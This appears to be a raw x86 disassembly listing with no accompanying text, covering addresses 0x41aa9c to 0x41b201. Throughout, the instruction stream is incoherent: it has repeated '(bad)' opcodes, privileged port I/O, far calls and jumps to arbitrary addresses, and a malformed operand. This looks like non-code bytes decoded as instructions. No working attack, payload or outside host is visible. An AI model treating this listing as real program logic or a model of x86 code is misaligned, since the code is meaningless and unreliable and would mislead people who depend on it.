  41aa9c:	mov    BYTE PTR [ecx-0x3066597],ah
  41aaa2:	dec    edi
  41aaa3:	sub    BYTE PTR [esi+0x4f1fd8df],dh
  41aaa9:	xchg   ecx,eax
  41aaaa:	sbb    BYTE PTR [ecx-0x6df08158],ch
  41aab0:	shl    edx,cl
  41aab2:	adc    DWORD PTR [ebx-0x47d18f3a],edx
  41aab8:	(bad)  [eax+0x3c085285]
  41aabe:	test   BYTE PTR [eax+ebp*8+0x532b7aab],bl
  41aac5:	out    dx,al
  41aac6:	mov    DWORD PTR [esi],eax
  41aac8:	inc    ebp
  41aac9:	ret    
  41aaca:	imul   ecx,DWORD PTR [ebx],0x5c4b31db
  41aad0:	xchg   ebp,ebp
  41aad2:	xchg   esi,eax
  41aad3:	cdq    
  41aad4:	in     eax,dx
  41aad5:	dec    ebx
  41aad6:	cmp    BYTE PTR [ebx+0x3bc2caec],al
  41aadc:	inc    edx
  41aadd:	je     0x41ab1d
  41aadf:	push   es
  41aae0:	xchg   edi,esp
  41aae2:	dec    esp
  41aae3:	icebp  
  41aae4:	jmp    0x90c98f9b
  41aae9:	dec    ecx
  41aaea:	or     BYTE PTR [esi],al
  41aaec:	or     DWORD PTR [esi-0x3f],0x1f552ddd
  41aaf3:	hlt    
  41aaf4:	jp     0x41ab35
  41aaf6:	lock sbb esp,DWORD PTR [eax]
  41aaf9:	or     ecx,DWORD PTR [esi]
  41aafb:	stc    
  41aafc:	inc    eax
  41aafd:	sub    eax,0xb88f3982
  41ab02:	das    
  41ab03:	sub    al,0x41
  41ab05:	dec    edi
  41ab06:	mov    edx,0x3d996a73
  41ab0b:	sub    bh,dh
  41ab0d:	mov    ds:0x56ed6cb7,al
  41ab12:	pop    es
  41ab13:	xor    eax,ecx
  41ab15:	or     BYTE PTR [esi-0x43e83f37],al
  41ab1b:	outs   dx,BYTE PTR ds:[esi]
  41ab1c:	aad    0xd0
  41ab1e:	push   edx
  41ab1f:	pop    ds
  41ab20:	mov    WORD PTR [esi-0x3c],fs
  41ab23:	in     al,0xc1
  41ab25:	push   cs
  41ab26:	es loop 0x41ab96
  41ab29:	cmp    BYTE PTR [ecx+0x38],cl
  41ab2c:	jbe    0x41aad3
  41ab2e:	cli    
  41ab2f:	gs push eax
  41ab31:	packssdw mm4,QWORD PTR [edx]
  41ab34:	pop    esi
  41ab35:	adc    dh,BYTE PTR [esi]
  41ab37:	shl    BYTE PTR [ecx],1
  41ab39:	xor    dh,BYTE PTR [ebp-0x1f377655]
  41ab3f:	mov    esi,0x9737d047
  41ab44:	mov    esi,edi
  41ab46:	and    DWORD PTR [esi-0xd],0xf37ab4d3
  41ab4d:	push   edx
  41ab4e:	cli    
  41ab4f:	fild   DWORD PTR [eax]
  41ab51:	mov    eax,DWORD PTR [ebx+0x2214936a]
  41ab57:	ret    0xaf4
  41ab5a:	xor    al,0xb
  41ab5c:	sbb    ch,BYTE PTR [esi-0x5b615e95]
  41ab62:	jge    0x41ab46
  41ab64:	and    eax,0x8a0334f0
  41ab69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab6b:	jb     0x41ab60
  41ab6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab6e:	out    dx,eax
  41ab6f:	fstp   TBYTE PTR [edx+0x54]
  41ab72:	push   ss
  41ab73:	aas    
  41ab74:	(bad)  
  41ab75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab76:	shl    esi,1
  41ab78:	pop    ds
  41ab79:	outs   dx,DWORD PTR ds:[esi]
  41ab7a:	xor    ebp,DWORD PTR [edx+0x37b57d32]
  41ab80:	mov    ecx,0xb99beb51
  41ab85:	push   cs
  41ab86:	or     al,0xb1
  41ab88:	test   DWORD PTR [edx+0x23],esi
  41ab8b:	sub    BYTE PTR [esi],al
  41ab8d:	pop    es
  41ab8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab8f:	mov    BYTE PTR [ebx],dh
  41ab91:	pop    es
  41ab92:	xchg   esi,eax
  41ab93:	leave  
  41ab94:	les    ecx,FWORD PTR [edi+0x7e92062c]
  41ab9a:	aad    0x61
  41ab9c:	add    edx,esi
  41ab9e:	outs   dx,BYTE PTR cs:[esi]
  41aba0:	ss add al,0x7
  41aba3:	mov    esi,0x33c8bbf0
  41aba8:	add    eax,0x6ae096cc
  41abad:	ins    DWORD PTR es:[edi],dx
  41abae:	nop
  41abaf:	out    dx,eax
  41abb0:	stc    
  41abb1:	outs   dx,DWORD PTR ds:[esi]
  41abb2:	rol    BYTE PTR [eax-0x7952e1b3],0x80
  41abb9:	push   ecx
  41abba:	mov    dl,0xd9
  41abbc:	push   cs
  41abbd:	sub    eax,0x72382323
  41abc2:	retf   
  41abc3:	out    0xe2,al
  41abc5:	sbb    eax,0x99c24693
  41abca:	sbb    bh,BYTE PTR [ebx-0x76]
  41abcd:	dec    edi
  41abce:	daa    
  41abcf:	xchg   ebx,eax
  41abd0:	les    edx,FWORD PTR [ebp+0xa]
  41abd3:	xchg   esp,eax
  41abd4:	pop    edx
  41abd5:	pop    ss
  41abd6:	push   edx
  41abd7:	test   al,0x84
  41abd9:	or     ecx,ebx
  41abdb:	mov    al,0x42
  41abdd:	xchg   esi,eax
  41abde:	outs   dx,BYTE PTR ds:[esi]
  41abdf:	jbe    0x41ac47
  41abe1:	std    
  41abe2:	data16 test al,0x2a
  41abe5:	jle    0x41ac0f
  41abe7:	iret   
  41abe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abe9:	inc    ecx
  41abea:	loop   0x41abfb
  41abec:	dec    eax
  41abed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abee:	inc    esp
  41abef:	rol    BYTE PTR [edi+eiz*2-0x55a01b24],1
  41abf6:	aam    0xad
  41abf8:	xchg   ebx,eax
  41abf9:	mov    ch,0xf
  41abfb:	inc    esp
  41abfc:	xchg   esi,eax
  41abfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abfe:	mov    al,ds:0x635ede4b
  41ac03:	mov    edx,0x85fb4dce
  41ac08:	xor    DWORD PTR [ecx+0x5602748c],0xbbeb49b0
  41ac12:	pop    ecx
  41ac13:	(bad)  
  41ac14:	jl     0x41abe2
  41ac16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac17:	sub    BYTE PTR [eax-0x5399b9f],cl
  41ac1d:	stos   BYTE PTR es:[edi],al
  41ac1e:	lock cdq 
  41ac20:	call   0x1cbc9969
  41ac25:	and    dl,cl
  41ac27:	into   
  41ac28:	clc    
  41ac29:	adc    al,0x42
  41ac2b:	ins    DWORD PTR es:[edi],dx
  41ac2c:	repz pop eax
  41ac2e:	sub    esp,DWORD PTR [ebx-0x76]
  41ac31:	sbb    esp,edi
  41ac33:	push   edx
  41ac34:	addr16 pop ss
  41ac36:	add    eax,0x67748ef7
  41ac3b:	aam    0xbb
  41ac3d:	fsubr  QWORD PTR [eiz*4+0x33752334]
  41ac44:	xchg   esi,eax
  41ac45:	test   DWORD PTR [edx],edx
  41ac47:	mov    fs,ebx
  41ac49:	mov    al,0x1a
  41ac4b:	or     DWORD PTR [esi+0x59fda01b],ebx
  41ac51:	jb     0x41abf0
  41ac53:	xchg   esp,eax
  41ac54:	cmp    esp,DWORD PTR [edx+0x7d]
  41ac57:	pushf  
  41ac58:	lods   al,BYTE PTR ds:[esi]
  41ac59:	in     eax,dx
  41ac5a:	iret   
  41ac5b:	pop    esi
  41ac5c:	iret   
  41ac5d:	sbb    BYTE PTR [ebp+0x39],0x98
  41ac61:	add    BYTE PTR [ebp+0x37],bl
  41ac64:	xchg   edi,eax
  41ac65:	(bad)  
  41ac66:	loopne 0x41ac7a
  41ac68:	dec    edi
  41ac69:	pop    esi
  41ac6a:	test   eax,0x7a8d4cde
  41ac6f:	xor    eax,ebx
  41ac71:	fcomp  QWORD PTR es:[eax]
  41ac74:	fmulp  st(0),st
  41ac76:	(bad)  [esi+0x72b48e9f]
  41ac7c:	jo     0x41acc6
  41ac7e:	bound  esp,QWORD PTR [ebx-0x9]
  41ac81:	xor    DWORD PTR [ecx-0x1f1bdb3d],ebp
  41ac87:	lds    eax,FWORD PTR [eax]
  41ac89:	shl    BYTE PTR [esi+0x75],1
  41ac8c:	mov    ds:0x3647c35a,al
  41ac91:	fs retf 0xeb13
  41ac95:	ja     0x41acca
  41ac97:	add    BYTE PTR gs:[edi],ah
  41ac9a:	mov    dh,BYTE PTR [esp+eax*1-0x10d5660e]
  41aca1:	es stc 
  41aca3:	dec    eax
  41aca4:	mov    esp,0x1d342ed6
  41aca9:	sbb    eax,0x8f6c3bf8
  41acae:	call   0xa5e7:0x9a2b6516
  41acb5:	mov    WORD PTR [ebx],fs
  41acb7:	push   ss
  41acb8:	mov    bl,0xe
  41acba:	mov    eax,ds:0xc65f8b89
  41acbf:	(bad)  
  41acc1:	(bad)  
  41acc2:	call   0x64616e89
  41acc7:	push   0xffffffaa
  41acc9:	push   esp
  41acca:	or     al,ah
  41accc:	jno    0x41ac59
  41acce:	loopne 0x41ace5
  41acd0:	pop    edx
  41acd1:	xchg   BYTE PTR [edx+0x5c],dh
  41acd4:	fimul  WORD PTR [edi-0x19]
  41acd7:	inc    esp
  41acd8:	inc    edi
  41acd9:	shr    BYTE PTR [ecx],1
  41acdb:	dec    edx
  41acdc:	lods   eax,DWORD PTR ds:[esi]
  41acdd:	daa    
  41acde:	out    dx,eax
  41acdf:	imul   ebp,ecx,0xab2b012
  41ace5:	sbb    BYTE PTR [ebx-0x1c],ch
  41ace8:	or     al,0xe9
  41acea:	xchg   ebp,eax
  41aceb:	jle    0x41ac9f
  41aced:	ins    DWORD PTR es:[edi],dx
  41acee:	xchg   BYTE PTR [ecx-0x73],ah
  41acf1:	pushf  
  41acf2:	mov    esi,0x2823c059
  41acf7:	call   esi
  41acf9:	xchg   ebx,eax
  41acfa:	pop    ebx
  41acfb:	sub    ecx,DWORD PTR [ebx-0x18cdc0ba]
  41ad01:	xor    DWORD PTR [ecx-0x5],edx
  41ad04:	imul   ecx,DWORD PTR [ecx+0x53],0x84edfcc2
  41ad0b:	inc    eax
  41ad0c:	ja     0x41acff
  41ad0e:	out    dx,al
  41ad0f:	add    eax,0xb3af1a69
  41ad14:	(bad)  
  41ad15:	cdq    
  41ad16:	out    0x66,al
  41ad18:	or     al,0x82
  41ad1a:	inc    esp
  41ad1b:	retf   0x35ec
  41ad1e:	jns    0x41ad4d
  41ad20:	fsub   QWORD PTR [edx-0x3cc1208d]
  41ad26:	pop    esp
  41ad27:	sbb    al,0x3e
  41ad29:	loopne 0x41acb4
  41ad2b:	js     0x41adac
  41ad2d:	stc    
  41ad2e:	push   esp
  41ad2f:	jl     0x41acee
  41ad31:	iret   
  41ad32:	push   ss
  41ad33:	lds    esi,FWORD PTR [edx]
  41ad35:	inc    edx
  41ad36:	cs mov cl,0x9e
  41ad39:	xchg   ebx,eax
  41ad3a:	test   DWORD PTR [eax-0x44],eax
  41ad3d:	push   esi
  41ad3e:	xchg   edi,eax
  41ad3f:	in     eax,dx
  41ad40:	aas    
  41ad41:	and    eax,0xde60f68c
  41ad46:	pop    edi
  41ad47:	xchg   cx,ax
  41ad49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad4a:	mov    ecx,0x9708bb0b
  41ad4f:	hlt    
  41ad50:	loop   0x41acfc
  41ad52:	fidiv  DWORD PTR [esp+edi*8-0x715abb43]
  41ad59:	mov    dh,0xc7
  41ad5b:	ret    0xdfbc
  41ad5e:	ret    0x679c
  41ad61:	pop    ds
  41ad62:	mov    edx,fs
  41ad64:	adc    ecx,eax
  41ad66:	and    eax,0xa03f6837
  41ad6b:	xchg   ebp,eax
  41ad6c:	dec    edi
  41ad6d:	jge    0x41ad68
  41ad6f:	aad    0x37
  41ad71:	inc    esi
  41ad72:	jge    0x41ad3d
  41ad74:	loopne 0x41adad
  41ad76:	cmp    esp,DWORD PTR [ebx-0xe551ebb]
  41ad7c:	push   ds
  41ad7d:	xchg   ebp,edx
  41ad7f:	fsub   QWORD PTR [esi-0x13]
  41ad82:	in     al,dx
  41ad83:	mov    ebx,0x31ff0d41
  41ad88:	jmp    0x4d39c0c1
  41ad8d:	scas   eax,DWORD PTR es:[edi]
  41ad8e:	pop    es
  41ad8f:	push   0x30
  41ad91:	rol    ebx,cl
  41ad93:	das    
  41ad94:	inc    eax
  41ad95:	ins    DWORD PTR es:[edi],dx
  41ad96:	mov    esp,0x82daacfb
  41ad9b:	sbb    esp,DWORD PTR [ecx]
  41ad9d:	or     al,0x5f
  41ad9f:	xor    eax,0x4a1934be
  41ada4:	test   DWORD PTR [ebx],eax
  41ada6:	clc    
  41ada7:	dec    edi
  41ada8:	adc    bl,BYTE PTR [ecx-0x4f]
  41adab:	dec    esp
  41adac:	cs jbe 0x41ad8c
  41adaf:	push   ebx
  41adb0:	xor    al,0xb0
  41adb2:	mov    fs,WORD PTR [ebp-0x6f814a98]
  41adb8:	add    bh,BYTE PTR [edi-0x50758cce]
  41adbe:	adc    DWORD PTR [edx+0x6898936],eax
  41adc4:	in     al,dx
  41adc5:	or     al,0x11
  41adc7:	les    esi,FWORD PTR [esi-0x7c]
  41adca:	dec    ebx
  41adcb:	mov    edi,0x9ddb3308
  41add0:	push   0x60d51ff3
  41add5:	mov    edx,0x7fd6a78d
  41adda:	pusha  
  41addb:	jnp    0x41ae14
  41addd:	pusha  
  41adde:	adc    al,BYTE PTR [edx]
  41ade0:	push   es
  41ade1:	retf   0x5802
  41ade4:	sub    esi,DWORD PTR ss:[ebx]
  41ade7:	push   ds
  41ade8:	shr    DWORD PTR [edx-0xc],cl
  41adeb:	inc    edi
  41adec:	leave  
  41aded:	add    eax,0x9ff0f4f9
  41adf2:	xor    ebx,DWORD PTR [esi+0x66]
  41adf5:	inc    eax
  41adf6:	jo     0x41ada5
  41adf8:	and    al,0x51
  41adfa:	idiv   BYTE PTR [edi+0x19]
  41adfd:	lods   al,BYTE PTR ds:[esi]
  41adfe:	jno    0x41ae76
  41ae00:	jns    0x41ad87
  41ae02:	and    al,0x9a
  41ae04:	sbb    DWORD PTR [edx],edi
  41ae06:	add    ebx,DWORD PTR [ecx-0x44812e62]
  41ae0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae0d:	data16 fwait
  41ae0f:	xchg   DWORD PTR [esi+0x10],eax
  41ae12:	lods   al,BYTE PTR ds:[esi]
  41ae13:	mov    bh,0xf6
  41ae15:	xor    al,0x68
  41ae17:	mov    ds:0xcc707914,al
  41ae1c:	sub    ah,BYTE PTR [edi+0x1c69e926]
  41ae22:	retf   
  41ae23:	jbe    0x41ae4f
  41ae25:	push   esp
  41ae26:	push   es
  41ae27:	stos   DWORD PTR es:[edi],eax
  41ae28:	sub    dl,BYTE PTR [eax]
  41ae2a:	mov    esp,0x6b28cd21
  41ae2f:	test   DWORD PTR [edi+0x461ff64f],0x5876da17
  41ae39:	icebp  
  41ae3a:	jle    0x41aea7
  41ae3c:	mov    ds:0x96b74d5,eax
  41ae41:	scas   al,BYTE PTR es:[edi]
  41ae42:	js     0x41ae30
  41ae44:	push   esi
  41ae45:	jb     0x41ae5f
  41ae47:	sub    eax,ebx
  41ae49:	sbb    esp,DWORD PTR [edi-0x70]
  41ae4c:	pop    ebp
  41ae4d:	icebp  
  41ae4e:	loop   0x41ae44
  41ae50:	nop
  41ae51:	sub    al,0x45
  41ae53:	cmp    DWORD PTR [edi],esi
  41ae55:	dec    edi
  41ae56:	jle    0x41aeab
  41ae58:	nop
  41ae59:	pushf  
  41ae5a:	push   eax
  41ae5b:	add    al,BYTE PTR [edi+eax*8]
  41ae5e:	pusha  
  41ae5f:	in     al,dx
  41ae60:	sbb    BYTE PTR [ebp-0x2aca4f44],dh
  41ae66:	je     0x41ade9
  41ae68:	adc    esi,ebx
  41ae6a:	push   ecx
  41ae6b:	ins    BYTE PTR es:[edi],dx
  41ae6c:	pcmpgtb mm7,QWORD PTR [ebx]
  41ae6f:	stc    
  41ae70:	xlat   BYTE PTR ds:[ebx]
  41ae71:	mov    ebp,0x4dacafac
  41ae76:	and    DWORD PTR [eax],0x951d7139
  41ae7c:	and    esp,DWORD PTR [ecx+ebp*2+0x5a]
  41ae80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae81:	mov    cl,cl
  41ae83:	xchg   esp,eax
  41ae84:	push   ecx
  41ae85:	adc    DWORD PTR [edx],esi
  41ae87:	out    dx,al
  41ae88:	imul   edx,DWORD PTR [ebx],0x45a7c0a9
  41ae8e:	adc    ah,BYTE PTR [ecx]
  41ae90:	in     eax,dx
  41ae91:	xor    esp,eax
  41ae93:	jg     0x41ae99
  41ae95:	add    al,0x5e
  41ae97:	xlat   BYTE PTR cs:[ebx]
  41ae99:	shl    BYTE PTR [ecx-0x3d],0x2c
  41ae9d:	aas    
  41ae9e:	inc    ebp
  41ae9f:	push   ebx
  41aea0:	xchg   edx,eax
  41aea1:	(bad)  
  41aea2:	xlat   BYTE PTR ds:[ebx]
  41aea3:	sbb    al,0x2
  41aea5:	xchg   edx,eax
  41aea6:	mov    cl,0x3d
  41aea8:	or     ecx,DWORD PTR [ebx-0x31]
  41aeab:	imul   esp,ebx,0x42b5f737
  41aeb1:	and    ecx,ebx
  41aeb3:	dec    ebp
  41aeb4:	add    ch,dl
  41aeb6:	pop    esp
  41aeb7:	mov    al,ds:0x3fa8ee94
  41aebc:	pop    ss
  41aebd:	mov    bh,0xe2
  41aebf:	sub    ch,cl
  41aec1:	rcr    DWORD PTR [esi+0x5376bde],0x89
  41aec8:	icebp  
  41aec9:	(bad)  
  41aeca:	out    dx,al
  41aecb:	xchg   edx,eax
  41aecc:	xchg   edx,eax
  41aecd:	cmp    BYTE PTR [esi-0x6e],ah
  41aed0:	into   
  41aed1:	mov    WORD PTR [ecx+0x9],gs
  41aed4:	mov    esp,edx
  41aed6:	mov    eax,0xf6006882
  41aedb:	jp     0x41af3b
  41aedd:	pop    esp
  41aede:	jne    0x41af01
  41aee0:	call   0x7b93:0x63b97831
  41aee7:	mov    ah,0xd3
  41aee9:	imul   edx,DWORD PTR [esi-0x13],0xffffff8b
  41aeed:	inc    ebx
  41aeee:	imul   edx,DWORD PTR [ecx*8+0x73be5f12],0x46
  41aef6:	aaa    
  41aef7:	nop
  41aef8:	sbb    ebx,DWORD PTR [eax-0x44]
  41aefb:	mov    ds:0xa78a6be4,eax
  41af00:	cs mov al,0x75
  41af03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af04:	imul   eax,DWORD PTR [edx-0x21388c37],0x3f
  41af0b:	mov    bh,BYTE PTR [edi+0x52]
  41af0e:	sbb    dh,BYTE PTR [ebp+0x59]
  41af11:	and    al,0xa7
  41af13:	jge    0x41af4e
  41af15:	aaa    
  41af16:	mov    eax,ds:0x25a31db9
  41af1b:	sti    
  41af1c:	mov    bh,0xc0
  41af1e:	and    edx,esp
  41af20:	(bad)  
  41af21:	jp     0x41af4c
  41af23:	dec    ebp
  41af24:	xchg   edi,eax
  41af25:	xor    bl,BYTE PTR [eax]
  41af27:	sbb    DWORD PTR [edx+0x79be2ad6],ebx
  41af2d:	mov    dh,0x96
  41af2f:	sub    eax,0x13530cc
  41af34:	or     eax,0xea43f97
  41af39:	mov    eax,0x910f5fb0
  41af3e:	cmp    ebx,DWORD PTR [edi]
  41af40:	scas   al,BYTE PTR es:[edi]
  41af41:	pop    esp
  41af42:	cwde   
  41af43:	xor    ebp,ebx
  41af45:	or     eax,0x19b5570f
  41af4a:	adc    al,0x9
  41af4c:	cwde   
  41af4d:	mov    esi,0xd12cb8fc
  41af52:	xchg   esp,eax
  41af53:	xor    eax,0x703f967f
  41af58:	adc    al,0x7
  41af5a:	stc    
  41af5b:	fidiv  WORD PTR [eax+0x72235982]
  41af61:	pop    eax
  41af62:	gs pop ebp
  41af64:	mov    eax,ds:0xdb585e63
  41af69:	adc    eax,0xe3fecbda
  41af6e:	ja     0x41afba
  41af70:	fiadd  WORD PTR [eax+eiz*8]
  41af73:	lea    ecx,[eax+0x1d]
  41af76:	mov    al,ds:0xd9212e8e
  41af7b:	mov    ah,0x92
  41af7d:	add    al,0x4e
  41af7f:	test   eax,0xe21b2da9
  41af84:	int3   
  41af85:	xor    DWORD PTR [esp+ebx*1-0x3a],edi
  41af89:	xchg   ecx,eax
  41af8a:	es gs dec eax
  41af8d:	xchg   esi,eax
  41af8e:	shl    DWORD PTR [edx+0x4eafae5e],0xf4
  41af95:	inc    edi
  41af96:	jp     0x41afd4
  41af98:	enter  0xb139,0x17
  41af9c:	adc    ebp,edx
  41af9e:	retf   0xd5bf
  41afa1:	jmp    esi
  41afa3:	lds    esi,FWORD PTR [edi-0x2a4bff61]
  41afa9:	sti    
  41afaa:	push   0xabb98cc8
  41afaf:	cs (bad) 
  41afb1:	in     eax,dx
  41afb2:	(bad)  
  41afb3:	fisub  DWORD PTR [eax+0x1d4eece3]
  41afb9:	call   0xef3c:0x1705ad3e
  41afc0:	mov    ch,0xd7
  41afc2:	cmp    bh,dh
  41afc4:	mov    ebx,0xcf794267
  41afc9:	(bad)
  41afcd:	int3   
  41afce:	sub    ecx,edi
  41afd0:	test   eax,0x2d20e10d
  41afd5:	mov    ah,0x7c
  41afd7:	add    eax,ecx
  41afd9:	add    DWORD PTR [edx-0x3a],edx
  41afdc:	jb     0x41afe2
  41afde:	dec    eax
  41afdf:	push   esi
  41afe0:	jle    0x41afa0
  41afe2:	push   cs
  41afe3:	stos   BYTE PTR es:[edi],al
  41afe4:	mov    ecx,0x1eb29b72
  41afe9:	xchg   ebp,eax
  41afea:	test   BYTE PTR [ebx-0x4b],ah
  41afed:	xchg   BYTE PTR [edx],bl
  41afef:	xchg   edx,eax
  41aff0:	(bad)  
  41aff2:	pop    ebp
  41aff3:	and    BYTE PTR [ecx],bh
  41aff5:	in     eax,dx
  41aff6:	je     0x41b076
  41aff8:	dec    eax
  41aff9:	jg     0x41afd3
  41affb:	or     ecx,DWORD PTR [edi+0x3c70eaa4]
  41b001:	jmp    0xf035e073
  41b006:	rcl    BYTE PTR [edi],0x40
  41b009:	and    dl,BYTE PTR [edx+eax*4]
  41b00c:	scas   al,BYTE PTR es:[edi]
  41b00d:	or     eax,0xdd9091cf
  41b012:	and    bl,dl
  41b014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b015:	call   0x5d52:0x4beddc97
  41b01c:	push   0x74
  41b01e:	fisubr DWORD PTR [eax+0x14]
  41b021:	js     0x41b026
  41b023:	(bad)  
  41b024:	int3   
  41b025:	sbb    al,0x11
  41b027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b028:	xor    bl,al
  41b02a:	and    dl,BYTE PTR [esi-0x78143894]
  41b030:	test   eax,0x5254026c
  41b035:	mov    cl,0x2
  41b037:	add    DWORD PTR [esp+ebx*4-0x1d093661],ebp
  41b03e:	dec    ecx
  41b03f:	mov    edx,0x5d1d3c94
  41b044:	ja     0x41afdd
  41b046:	sub    eax,0xcd57ca28
  41b04b:	aas    
  41b04c:	lock dec ebx
  41b04e:	cwde   
  41b04f:	push   ebp
  41b050:	push   es
  41b051:	mov    esi,0x18dfa137
  41b056:	add    al,0xaa
  41b058:	aaa    
  41b059:	mov    ds:0xd9b7b396,eax
  41b05e:	pop    es
  41b05f:	pop    esp
  41b060:	in     al,0x26
  41b062:	enter  0xf924,0x34
  41b066:	fld    TBYTE PTR [edx-0xb964652]
  41b06c:	add    eax,0x432eb98c
  41b071:	arpl   WORD PTR ds:0x513f226a,ax
  41b077:	and    DWORD PTR [ecx-0x5a45a786],esp
  41b07d:	push   eax
  41b07e:	shl    BYTE PTR [edi-0x1d9b7c16],1
  41b084:	mov    bh,0x72
  41b086:	in     al,dx
  41b087:	shl    esp,cl
  41b089:	iret   
  41b08a:	shr    DWORD PTR [eax-0x57131a6e],1
  41b090:	das    
  41b091:	retf   
  41b092:	sub    eax,0x665374f3
  41b097:	adc    eax,0xad1b1789
  41b09c:	and    al,BYTE PTR [ecx-0x21]
  41b09f:	xchg   ecx,eax
  41b0a0:	jbe    0x41b0d5
  41b0a2:	xchg   ebx,eax
  41b0a3:	addr16 (bad) 
  41b0a5:	xor    eax,0xca623c3c
  41b0aa:	call   0x6b54eee2
  41b0af:	mov    esp,0x79391335
  41b0b4:	das    
  41b0b5:	jle    0x41b04a
  41b0b7:	repz sbb al,0x7f
  41b0ba:	add    DWORD PTR [edx+0x453b98a4],ebp
  41b0c0:	aad    0x3c
  41b0c2:	(bad)  
  41b0c3:	cmovae edx,DWORD PTR [ecx]
  41b0c6:	cmc    
  41b0c7:	int    0x7
  41b0c9:	inc    esi
  41b0ca:	repnz mov al,0xd3
  41b0cd:	pop    ebp
  41b0ce:	cmp    BYTE PTR [eax+0x7fe72f98],dl
  41b0d4:	mov    eax,ds:0x79910890
  41b0d9:	fld    QWORD PTR [ebx]
  41b0db:	jbe    0x41b158
  41b0dd:	sbb    ecx,esp
  41b0df:	ja     0x41b14c
  41b0e1:	out    0x3d,al
  41b0e3:	mov    cl,0xe0
  41b0e5:	adc    esi,esi
  41b0e7:	sbb    esp,eax
  41b0e9:	sbb    DWORD PTR [edi-0x12],0x93e69ff0
  41b0f0:	adc    edx,DWORD PTR [ebx-0x111a8a86]
  41b0f6:	test   al,0x6c
  41b0f8:	xor    BYTE PTR [esi-0x1b],bh
  41b0fb:	imul   ecx,DWORD PTR [ecx-0x77],0xff390b03
  41b102:	jno    0x41b0f6
  41b104:	cmp    eax,0x54b1d83b
  41b109:	call   0x53536128
  41b10e:	jnp    0x41b0e2
  41b110:	out    dx,eax
  41b111:	sub    al,0xf9
  41b113:	div    BYTE PTR [ebp+ebx*8+0x2f4fc597]
  41b11a:	scas   eax,DWORD PTR es:[edi]
  41b11b:	xchg   ebx,eax
  41b11c:	cmp    al,0x93
  41b11e:	xor    ch,dh
  41b120:	push   esi
  41b121:	sbb    BYTE PTR [ecx],cl
  41b123:	mov    WORD PTR [esi],?
  41b125:	mov    ah,0x88
  41b127:	xor    edi,DWORD PTR [ebx]
  41b129:	pop    ebx
  41b12a:	shl    BYTE PTR [esi-0x67],0xb8
  41b12e:	cwde   
  41b12f:	inc    edi
  41b130:	push   esp
  41b131:	ret    0x8717
  41b134:	lea    edi,[eax+ecx*8+0x1a768521]
  41b13b:	dec    ebx
  41b13c:	xchg   ebx,eax
  41b13d:	jnp    0x41b159
  41b13f:	frstor [edx]
  41b141:	jo     0x41b146
  41b143:	rol    DWORD PTR [esi],0xed
  41b146:	mov    edi,0x6012f83
  41b14b:	dec    esi
  41b14c:	pop    eax
  41b14d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b14e:	and    bh,BYTE PTR [edi+0x4]
  41b151:	xor    dh,BYTE PTR [edi+0x1f]
  41b154:	xor    BYTE PTR [edx+ebp*8-0x3022f01d],cl
  41b15b:	inc    edi
  41b15c:	ds and ecx,ebx
  41b15f:	inc    edx
  41b160:	sbb    BYTE PTR [ebp+0x150c6cff],bl
  41b166:	outs   dx,DWORD PTR ds:[esi]
  41b167:	xchg   esp,eax
  41b168:	mov    edx,0x6b01cc54
  41b16d:	call   0x58279246
  41b172:	push   ebx
  41b173:	add    DWORD PTR [ebx+edi*1-0x70],edi
  41b177:	cmp    al,0x9b
  41b179:	xor    BYTE PTR [ecx],bl
  41b17b:	jnp    0x41b1e3
  41b17d:	mul    BYTE PTR ds:0xaa61a678
  41b183:	push   esi
  41b184:	(bad)  
  41b185:	in     eax,dx
  41b186:	sub    ah,al
  41b188:	sbb    edi,0xffffffdb
  41b18b:	push   ebp
  41b18c:	inc    ebp
  41b18d:	jmp    0x1666:0x140778a3
  41b194:	fisub  WORD PTR [eax-0x17ca763d]
  41b19a:	and    bh,BYTE PTR [edx]
  41b19c:	loopne 0x41b1e9
  41b19e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b19f:	sbb    bh,bh
  41b1a1:	adc    al,0x17
  41b1a3:	retf   
  41b1a4:	gs cwde 
  41b1a6:	push   cs
  41b1a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1a8:	cmp    DWORD PTR [ebp+0x6c71610f],edi
  41b1ae:	jae    0x41b18f
  41b1b0:	jle    0x41b18f
  41b1b2:	adc    eax,0x2af447ab
  41b1b7:	mov    edi,0xa4f6a69
  41b1bc:	ret    0x4be1
  41b1bf:	mov    esi,0xa4b570be
  41b1c4:	cmp    ch,BYTE PTR [ebp+0x78]
  41b1c7:	(bad)  
  41b1c8:	je     0x41b1fd
  41b1ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1cb:	mov    BYTE PTR es:[edi-0x4f],cl
  41b1cf:	mov    cl,0x39
  41b1d1:	sub    BYTE PTR [esi],bl
  41b1d3:	sbb    dl,ah
  41b1d5:	mov    ds:0x5e97b55c,al
  41b1da:	xor    al,0xeb
  41b1dc:	sbb    BYTE PTR [ecx-0x67],0xcd
  41b1e0:	es adc eax,0xc535f908
  41b1e6:	or     al,0x3d
  41b1e8:	not    DWORD PTR [edi+0x26d7a1d7]
  41b1ee:	adc    bl,BYTE PTR [edx+0x3b7466cf]
  41b1f4:	xor    al,0xff
  41b1f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1f7:	jno    0x41b18d
  41b1f9:	and    BYTE PTR [ebx+esi*4],bh
  41b1fc:	jb     0x41b22f
  41b1fe:	xchg   edi,eax
  41b1ff:	push   ebp
  41b200:	xchg   edi,eax
  41b201:	inc    ecx
